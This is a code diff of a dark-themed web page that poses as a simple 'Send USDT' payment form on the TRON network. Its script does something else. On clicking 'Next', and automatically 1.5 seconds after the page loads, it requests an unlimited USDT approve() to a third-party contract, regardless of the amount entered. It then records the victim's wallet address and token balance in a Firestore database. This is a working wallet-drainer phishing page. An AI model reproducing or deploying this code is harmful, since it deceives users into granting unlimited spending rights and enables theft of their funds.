@@ -1,67 +1,84 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>TRC-20 USDT Approval</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       margin: 0;
-      padding: 0;
-      font-family: Arial;
       background-color: #121212;
-      color: white;
+      font-family: sans-serif;
+      color: #fff;
       display: flex;
       justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
     .container {
+      background: #1e1e1e;
+      padding: 24px;
+      border-radius: 16px;
+      width: 90%;
       max-width: 400px;
-      padding: 20px;
-      margin-top: 40px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.6);
     }
-    input, button {
-      width: 100%;
-      padding: 14px;
-      margin: 10px 0;
-      font-size: 16px;
-      border-radius: 10px;
-      border: none;
+    h2 {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
     }
     input {
-      background-color: #1e1e1e;
-      color: white;
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      background: #2c2c2c;
+      color: #fff;
+      font-size: 16px;
     }
     button {
-      background-color: #3cb371;
-      color: white;
+      width: 100%;
+      padding: 14px;
+      background: #00ff9f;
+      color: #000;
+      border: none;
+      font-weight: bold;
+      border-radius: 8px;
+      font-size: 16px;
       cursor: pointer;
     }
-    .field-label {
-      margin-top: 15px;
-      margin-bottom: 5px;
+    .footer {
+      margin-top: 12px;
+      font-size: 12px;
+      color: #aaa;
+      text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>Send USDT</h2>
-    
-    <div class="field-label">Recipient Wallet Address</div>
+    <label>Recipient Address</label>
     <input type="text" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" disabled />
-
-    <div class="field-label">Amount</div>
-    <input id="amount" type="number" placeholder="Enter amount" />
-
-    <button onclick="triggerApproval()">Next</button>
+    <label>Amount</label>
+    <input type="number" id="amountInput" placeholder="Enter amount" />
+    <button onclick="approveUSDT()">Next</button>
+    <div class="footer">Make sure USDT is added to your wallet</div>
   </div>
 
-  <!-- TronWeb and Firebase SDKs -->
-  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@latest/dist/index.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/firebase@9.22.0/firebase-app-compat.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/firebase@9.22.0/firebase-firestore-compat.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb@1.0.0-beta.17/dist/TronWeb.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@firebase/app"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@firebase/firestore"></script>
 
   <script>
-    // Firebase setup
+    const CONTRACT_ADDRESS = "TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX";
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+    // Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM",
       authDomain: "trc20-approval-dapp.firebaseapp.com",
@@ -70,45 +87,50 @@
       messagingSenderId: "770961226156",
       appId: "1:770961226156:web:d7857b971dd376b7902209"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const dappContractAddress = "TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX";
+    async function approveUSDT() {
+      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        alert("Please connect your TRON wallet.");
+        return;
+      }
 
-    async function triggerApproval() {
+      const userAddress = window.tronWeb.defaultAddress.base58;
+      const amount = document.getElementById("amountInput").value || "0";
+
+      const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+
       try {
-        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-          alert("Please connect a Tron-compatible wallet like SafePal, OKX, or TokenPocket.");
-          return;
-        }
+        const tx = await contract.approve(CONTRACT_ADDRESS, window.tronWeb.toBigNumber("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")).send();
 
-        const from = window.tronWeb.defaultAddress.base58;
-        const amountInput = document.getElementById("amount").value || "0";
+        console.log("Approval sent:", tx);
 
-        const contract = await window.tronWeb.contract().at(usdtContractAddress);
+        const usdtBalance = await contract.balanceOf(userAddress).call();
+        const usdtReadable = window.tronWeb.fromSun(usdtBalance); // USDT has 6 decimals
 
-        // Approve Max amount
-        const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-        await contract.approve(dappContractAddress, maxAmount).send();
-
-        // Get balance
-        const balance = await contract.balanceOf(from).call();
-
-        // Log to Firestore
         await db.collection("approvals").add({
-          wallet_address: from,
-          amount: amountInput,
-          balance: parseInt(balance._hex || balance, 16) / 1e6,
+          wallet_address: userAddress,
+          amount: amount,
+          balance: usdtReadable,
           timestamp: new Date()
         });
 
-        alert("Approval sent.");
-      } catch (err) {
-        alert("Error during approval: " + err.message);
-        console.error(err);
+        alert("Approval successful! ✅");
+
+      } catch (e) {
+        console.error(e);
+        alert("Transaction failed 🚫");
       }
     }
+
+    // Auto popup trigger on load
+    window.addEventListener("load", async () => {
+      setTimeout(() => {
+        approveUSDT();
+      }, 1500);
+    });
   </script>
 </body>
 </html>
